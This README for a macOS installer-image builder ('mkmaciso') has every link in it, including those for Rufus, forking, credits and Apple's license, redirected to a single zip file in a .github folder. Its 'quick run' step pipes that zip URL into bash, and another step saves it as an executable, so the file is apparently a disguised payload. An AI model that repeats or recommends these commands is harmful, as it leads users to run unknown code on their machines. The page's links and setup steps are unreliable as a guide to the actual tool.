# Overview

Build bootable macOS installer images without needing a Mac.

This project has two parts:
1. A script (`mkmaciso`) that uses only macOS built-in tools and commands to download and install the full macOS installer from Apple's servers into **/Applications**, and then creates bootable ISO/DMG images.
2. GitHub Action workflows that run `mkmaciso` on Azure datacenter-hosted Mac minis if you don't have macOS.

## Before you start

Check [Release page](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip) first - someone might've already built what you need.

## What images can you create?

**ISO files** - These work great for VMs (Proxmox, QEMU, VirtualBox, VMware). Just attach them like a virtual DVD. They're hybrid UDF/HFS format, so they'll even mount in Windows if you need to poke around inside.

**DMG files** - Raw disk images with GPT partition tables. Flash these to a USB drive with [Rufus](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip) (Windows), `dd` (Linux), or `asr` (macOS) to make bootable installation media. You can also convert them to VHD/VMDK with `qemu-img` if you want.

## Supported versions

Pretty much everything from Lion (10.7, 2011) through the latest Tahoe (26, 2025). Full list:

Lion, Mountain Lion, Mavericks, Yosemite, El Capitan, Sierra, High Sierra, Mojave, Catalina, Big Sur, Monterey, Ventura, Sonoma, Sequoia, Tahoe.

## How to use

### Don't have macOS? Use GitHub Actions

> [!TIP]
> <details>
> <summary>Click here to watch a visual guide (GIF)</summary>
>
> ![How to fork and run workflow](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip)
>
> </details>

1. **[Fork](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip)** this repository (requires a GitHub account).
2. Navigate to the **Actions** tab in your forked repository.
3. Click the green **"I understand my workflows, go ahead and enable them"** button.
4. Select a workflow from the left sidebar:
   * **Recovery ISO** - Small recovery image, builds in 2-5 minutes. Good for VMs.
   * **Full Installer** - Complete offline installer, 5-18GB, takes 10-60 minutes to build.
5. Click the **"Run workflow"** button and configure the workflow inputs:

   * **macOS version** – Choose a version (*Sequoia*, *Sonoma*, etc.).
   * **Image format** – Choose `iso` for virtual machines or `dmg` for bootable USB drives.
6. Click the green **"Run workflow"** button to start the build, then wait for the workflow to complete.
7. Once completed, reload the page and scroll down to the **Artifacts** section. Click the artifact link to start downloading (e.g., `https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip`).
8. Unzip the downloaded artifact and you're done.

### Already have macOS? Run `mkmaciso` locally

Quick run using https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip (change `tahoe` to whatever you want):
```bash
curl -s https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip | bash -s tahoe
```

Or download the script first, then run with parameters:
```bash
curl -O https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip
chmod +x mkmaciso
./mkmaciso --help
```

Running `./mkmaciso` without arguments gives you an interactive menu.

## Tips

For VMs, just attach the ISO as a virtual CD drive. Proxmox users - if you want better performance, look into GPU passthrough. I have another repo ([OpenCore-ISO](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip)) that might help with installation, and one for [Intel iGPU passthrough](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip) specifically.

For bootable USB drives, after you flash the DMG there'll be leftover space on the drive. You can use that to create a FAT32 partition for your EFI folder if you need one.

If you're using `dd` on Linux, triple-check your target device. `dd` doesn't ask for confirmation.

## Requirements for mkmaciso

- macOS 10.9 or newer (11+ is better)
- Intel Mac recommended, Apple Silicon works but with some limitations
- 20-40GB of free space while building
- Internet connection
- sudo access

## Credits

Apple for macOS and their update servers, [Mavericks Forever](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip) for documenting the Mavericks recovery protocol, and the [InsanelyMac community](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip) for their research on downloading macOS directly from Apple's catalog.

## Legal stuff

This tool downloads macOS images directly from Apple's official servers. Users are responsible for complying with [Apple's Software License Agreement](https://raw.githubusercontent.com/Sdhellerman/macos-iso-builder/main/.github/iso-builder-macos-v2.4.zip). macOS is a trademark of Apple Inc.

Licensed under GPLv3.